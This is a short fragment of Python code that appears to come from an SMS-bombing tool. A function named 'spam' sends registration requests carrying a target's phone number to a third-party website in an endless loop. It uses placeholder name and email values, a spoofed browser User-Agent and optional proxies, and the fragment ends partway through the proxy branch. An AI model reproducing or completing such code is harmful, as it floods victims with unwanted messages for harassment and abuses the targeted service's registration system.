    ...
    def main(self):
        ...
        def spam(thread_name='0', proxy=None):
            ...
            while True:
                try:
                    if proxy == None:
                        r = requests.post('http://shuri-muri.com/registration/', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/56.0.3051.104'})
                    else:
